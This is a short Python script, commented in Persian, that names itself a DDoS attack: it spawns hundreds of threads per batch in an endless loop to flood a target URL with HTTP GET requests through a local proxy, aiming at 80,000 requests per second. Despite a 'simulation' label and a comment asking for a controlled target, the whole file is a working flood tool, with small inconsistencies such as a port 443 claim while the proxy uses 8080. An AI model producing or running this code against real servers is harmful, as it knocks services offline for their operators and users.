import requests
import threading
import time

# تنظیمات هدف
target_url = "https://example.com"  # URL هدف (باید URL واقعی و کنترل‌شده باشد)
max_requests_per_second = 80000  # تعداد درخواست‌ها در ثانیه
report_interval = 100  # تعداد درخواست‌ها برای گزارش‌دهی

# شمارش درخواست‌ها
request_count = 0

# تنظیم پروکسی (در اینجا پروکسی لوکال با آی‌پی 127.0.0.1 و پورت 8080 تنظیم شده است)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# تابع ارسال درخواست HTTP
def send_request():
    global request_count
    try:
        # ارسال درخواست از طریق پروکسی
        response = requests.get(target_url, proxies=proxies)
        request_count += 1
        if request_count % report_interval == 0:
            print(f"[INFO] {request_count} requests sent so far.")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to send request: {e}")

# تابع اجرای حمله DDoS
def ddos_attack():
    while True:
        threads = []
        for _ in range(max_requests_per_second // 100):  # تقسیم 80,000 درخواست به 100 درخواست در هر ثانیه
            t = threading.Thread(target=send_request)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        time.sleep(1)  # 1 ثانیه تأخیر بین هر دسته از درخواست‌ها

if __name__ == "__main__":
    print("[INFO] Starting DDoS Attack Simulation with Proxy on Port 443...")
    ddos_attack()
    print("[INFO] Attack finished.")
